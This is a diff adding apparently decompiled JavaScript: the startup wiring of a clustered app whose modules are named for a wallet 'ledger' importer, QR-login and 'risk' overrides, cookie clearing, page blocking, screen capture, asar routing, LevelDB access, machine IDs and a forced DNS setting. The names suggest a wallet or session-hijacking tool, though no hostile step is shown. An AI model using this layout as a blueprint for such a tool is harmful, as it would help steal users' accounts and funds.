@@ -1,0 +1,172 @@
+function func_start_0x10000d2ff()
+{
+	r1 = Object["prototype"]
+	global_boe = r1["hasOwnProperty"]
+	global_lO = {}
+	r3 = new {"hasBrowserEnv": null, "hasStandardBrowserEnv": null, "hasStandardBrowserWebWorkerEnv": null, "navigator": null, "origin": null}
+	r3["hasBrowserEnv"] = func_hasBrowserEnv_0x1000034ff
+	r3["hasStandardBrowserEnv"] = func_hasStandardBrowserEnv_0x100003500
+	r3["hasStandardBrowserWebWorkerEnv"] = func_hasStandardBrowserWebWorkerEnv_0x100003501
+	r3["navigator"] = func_getNavigator_0x100003502
+	r3["origin"] = func_getOrigin_0x100003503
+	ACCU = func_defineGetterProperties_0x100003170(global_lO, r3)
+	global_sX = {}
+	r3 = new {"MAX": null, "NIL": null, "parse": null, "stringify": null, "v1": null, "v1ToV6": null, "v3": null, "v4": null, "v5": null, "v6": null, "v6ToV1": null, "v7": null, "validate": null, "version": null}
+	r3["MAX"] = func_getMaxUuid_0x10000607d
+	r3["NIL"] = func_getGlobalGP_0x10000607e
+	r3["parse"] = func_getUuidParser_0x10000607f
+	r3["stringify"] = func_getStringifier_0x100006080
+	r3["v1"] = func_getUuidV1Generator_0x100006081
+	r3["v1ToV6"] = func_getV1ToV6Converter_0x100006082
+	r3["v3"] = func_createUuidV3_0x100006083
+	r3["v4"] = func_getUuidV4Generator_0x100006084
+	r3["v5"] = func_createUuidV5_0x100006085
+	r3["v6"] = func_getUuidV6Generator_0x100006086
+	r3["v6ToV1"] = func_getV6ToV1Converter_0x100006087
+	r3["v7"] = func_getUuidV7Generator_0x100006088
+	r3["validate"] = func_getIsMultipartString_0x100006089
+	r3["version"] = func_getVersion_0x10000608a
+	ACCU = func_defineGetterProperties_0x100003170(global_sX, r3)
+	global_IX = {}
+	r3 = new {"providers": null}
+	r3["providers"] = func_getProviders_0x100006740
+	ACCU = func_defineGetterProperties_0x100003170(global_IX, r3)
+	global_cz = {}
+	r3 = new {"ledger": null}
+	r3["ledger"] = func_getLedgerImporter_0x10000a993
+	ACCU = func_defineGetterProperties_0x100003170(global_cz, r3)
+	global_Nm = {}
+	r3 = new {"default": null, "disableOverrideQR": null, "overrideQR": null}
+	r3["default"] = func_getPm_0x10000bdcb
+	r3["disableOverrideQR"] = func_getRemoveElementFn_0x10000bdcc
+	r3["overrideQR"] = func_getQrLoginInitiator_0x10000bdcd
+	ACCU = func_defineGetterProperties_0x100003170(global_Nm, r3)
+	global_Bp = {}
+	r3 = new {"default": null, "disableOverrideQR": null, "disableRisk": null, "overrideQR": null, "overrideRisk": null}
+	r3["default"] = func_getYV_0x10000bdd3
+	r3["disableOverrideQR"] = func_disableOverrideQR_0x10000bdd4
+	r3["disableRisk"] = func_disableRisk_0x10000bdd5
+	r3["overrideQR"] = func_getQROverride_0x10000bdd6
+	r3["overrideRisk"] = func_getRiskOverride_0x10000bdd7
+	ACCU = func_defineGetterProperties_0x100003170(global_Bp, r3)
+	global_Xm = {}
+	r3 = new {"default": null, "disableOverrideFrame": null, "overrideFrame": null}
+	r3["default"] = func_returnGlobalGm_0x10000be08
+	r3["disableOverrideFrame"] = func_disableOverrideFrame_0x10000be09
+	r3["overrideFrame"] = func_getErrorDisplay_0x10000be0a
+	ACCU = func_defineGetterProperties_0x100003170(global_Xm, r3)
+	global_n6 = {}
+	r3 = new {"block": null, "clearCookies": null, "default": null, "disableBlock": null, "disableClearCookies": null, "disableShowPage": null, "showPage": null}
+	r3["block"] = func_getRegisterHostRoutes_0x10000be0f
+	r3["clearCookies"] = func_clearCookies_0x10000be10
+	r3["default"] = func_returnGlobalUp_0x10000be11
+	r3["disableBlock"] = func_getRemoveElementFn_0x10000be12
+	r3["disableClearCookies"] = func_disableClearCookies_0x10000be13
+	r3["disableShowPage"] = func_getRemoveUndefined_0x10000be14
+	r3["showPage"] = func_getShowPageHandler_0x10000be15
+	ACCU = func_defineGetterProperties_0x100003170(global_n6, r3)
+	global_QU = {}
+	r3 = new {"default": null}
+	r3["default"] = func_returnGlobalRL_0x10000c8ff
+	ACCU = func_defineGetterProperties_0x100003170(global_QU, r3)
+	global_s7e = {}
+	global_G7e = {}
+	ACCU = func_requireCluster_0x10000317e()
+	r1 = (require("dns"))["setServers"]
+	r3 = new [0, 0]
+	r3[0] = "1.1.1.1"
+	r3[1] = "8.8.8.8"
+	ACCU = r1(r3)
+	ACCU = func_setupWorkerPrimary_0x100000001(__filename)
+	if (func_setupWorkerPrimary_0x100000001(__filename))
+	{
+		ACCU = func_initializeApplication_0x10000c926()
+		ACCU = func_markEsModule_0x10000317b(global_s7e)
+	}
+	else
+	{
+		ACCU = func_initializeModules_0x10000d2fe()
+		ACCU = func_markEsModule_0x10000317b(global_G7e)
+	}
+	r0 = ACCU
+	return ACCU
+}
+function func_initializeModules_0x10000d2fe()
+{
+	r4 = 0
+	ACCU = func_initializeAsarRouter_0x10000d28b()
+	ACCU = func_initializeScreenCaptureModule_0x10000d2e3()
+	ACCU = func_initSecurityModule_0x10000d2ef()
+	ACCU = func_initializeNotificationModule_0x10000d2f9()
+	return undefined
+}
+function func_initializeApplication_0x10000c926()
+{
+	r4 = 0
+	ACCU = func_initializeFaroClient_0x100005504()
+	ACCU = func_initializeMainRouter_0x10000c910()
+	ACCU = func_initLevelDbModule_0x10000a912()
+	ACCU = func_initializeMachineIdModule_0x10000c915()
+	ACCU = func_initializeModules_0x10000c91e()
+	ACCU = func_runMigrations_0x100000ab3()
+	return undefined
+}
+function func_requireCluster_0x10000317e()
+{
+	r7 = require("cluster")
+	global_uE = func_interopRequireWildcard_0x10000317a(r7)
+	return undefined
+}
+function func_markEsModule_0x10000317b(a0)
+{
+	r2 = {}
+	r3 = "__esModule"
+	r4 = new {"value": <true}
+	r1 = (Object["defineProperty"])(r2, r3, r4)
+	return func_copyProperties_0x100003179(r1, a0)
+}
+function func_defineGetterProperties_0x100003170(a0, a1)
+{
+	if (!a1 == undefined)
+	{
+		r6 = Generator(ToObject(a1))
+		r10 = 0
+		while (true)
+		{
+			if (!GeneratorContinue(r10)) break
+			if (r6.next().value == undefined) continue
+			r4 = r6.next().value
+			r3 = r6.next().value
+			r16 = new {"get": null, "enumerable": <true}
+			r16["get"] = a1[r4]
+			r12 = r1
+			r14 = a0
+			r15 = r4
+			ACCU = (Object["defineProperty"])(r14, r15, r16)
+			r10 = GeneratorStep(r10)
+		}
+	}
+	return undefined
+}
+function func_setupWorkerPrimary_0x100000001(a0)
+{
+	if (!global_uE["default"]["isPrimary"])
+		|| (!(require("worker_threads"))["isMainThread"])
+	{
+		return false
+	}
+	if ((a0))
+	{
+		ACCU = Error
+		ACCU = Error("Worker root already configured")
+	}
+	r4 = global_uE["default"]
+	if (r4["isPrimary"])
+	{
+		r4 = global_uE["default"]["setupPrimary"]
+		r6 = new {"serialization": null}
+		r6["serialization"] = "advanced"
+		ACCU = r4(r6)
+	}
+	return true
+}
